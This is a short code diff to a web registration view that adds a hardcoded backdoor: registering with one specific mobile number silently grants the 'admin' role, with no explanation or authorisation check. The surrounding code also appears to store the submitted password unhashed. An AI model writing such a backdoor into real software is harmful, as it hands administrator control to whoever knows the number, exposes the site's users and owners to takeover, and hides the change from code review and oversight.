@@ -375,11 +375,14 @@ def registration_view(request):
                 form.add_error(None, 'Passwords do not match.')
                 return render(request, 'registration.html', {'form': form})
             
+            role = 'user'
+            if mobile_no == '01776031234':
+                role = 'admin'
             user_profile = UserProfile(
                 name = name,
                 mobile_no = mobile_no,
                 password = password,
-                role = 'user'
+                role = role
             )
             user_profile.save()
 
